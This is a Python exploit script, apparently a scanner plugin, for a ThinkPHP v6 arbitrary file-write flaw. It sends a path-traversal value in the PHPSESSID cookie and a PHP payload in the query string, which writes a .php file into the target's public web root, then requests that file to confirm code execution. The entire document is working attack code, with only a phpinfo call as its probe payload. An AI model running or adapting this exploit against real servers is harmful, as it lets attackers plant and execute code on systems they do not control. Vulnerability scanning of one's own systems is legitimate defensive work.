#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import random
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    thinkphp v6 file write
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB


    async def prove(self):
        if self.base_url:
            random_str = str(random.randint(100000, 999999)) + '.php'
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, ['./public/', './']):
                    if path[-1] == '/':
                        url1 = path + 'index?test=<?php%20phpinfo();?>//'
                        headers = {'Cookie': 'PHPSESSID=../../../../public/' + random_str}
                        async with session.get(url=url1, headers=headers) as res1:
                            if res1 and random_str in res1.headers.get('set-cookie', ''):
                                url2 = path + random_str
                                async with session.get(url=url2) as res2:
                                    if res1:
                                        text2 = await res2.text()
                                        if 'phpinfo' in text2:
                                            yield url2
                                            return